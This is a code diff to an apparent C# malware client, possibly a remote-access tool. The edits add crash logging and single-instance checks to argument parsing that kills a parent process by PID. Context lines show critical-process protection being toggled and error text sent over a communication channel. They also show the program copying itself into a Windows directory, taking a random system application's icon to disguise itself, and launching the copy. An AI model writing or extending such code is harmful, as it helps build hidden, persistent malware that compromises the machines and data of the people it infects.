@@ -138,6 +138,8 @@ namespace Client
 
         private async static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
         {
+            Console.WriteLine("Current Domain Crash : " + e.ExceptionObject.ToString());
+
             if (e.IsTerminating)
                 Armitage.Critical_Process.Unprotect();
 
@@ -145,8 +147,9 @@ namespace Client
         }
 
         private async static void Application_ThreadException(object sender, ThreadExceptionEventArgs e)
-        {        
-            await  Communication.String_Stacker.Send(e.Exception.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
+        {
+            Console.WriteLine("Thread Exception Crash : " + e.Exception.ToString());
+            await Communication.String_Stacker.Send(e.Exception.ToString(), Communication.String_Stacker.StringType.ApplicationEvent);
         }
 
         public static void ArgsParser(string[] args)
@@ -156,10 +159,18 @@ namespace Client
                 if (args.Length > 0)
                 {
                     // PID of parent to kill
-                    int parent = int.Parse(args[0].Trim());
-                    if (parent > 0)
-                        Process.GetProcessById(parent).Kill();
-
+                    int parent = 0;
+                    if (int.TryParse(args[0].Trim(), out parent))
+                    {
+                        if (parent > 0)
+                            Process.GetProcessById(parent).Kill();
+                    }
+                    else if (args[0].Trim() == "system") {
+                        // kill self if self already is running
+                        if (Utilities.Process_Utils.GetSameProcesses().Length > 0) {
+                            Environment.Exit(0); // exit because process is already running...
+                        }
+                    }
                     // this wont get called if the argument is only PID
                     if (args.Length > 1)
                     {
@@ -196,6 +207,7 @@ namespace Client
                 var randicon = Utilities.Icon_Util.ExtractIconFromExecutable(fullrandomsysapp);
 
                 Utilities.Icon_Util.ChangeIcon(windirpath, randicon);
+
                 // run from there
                 Process.Start(windirpath);
 
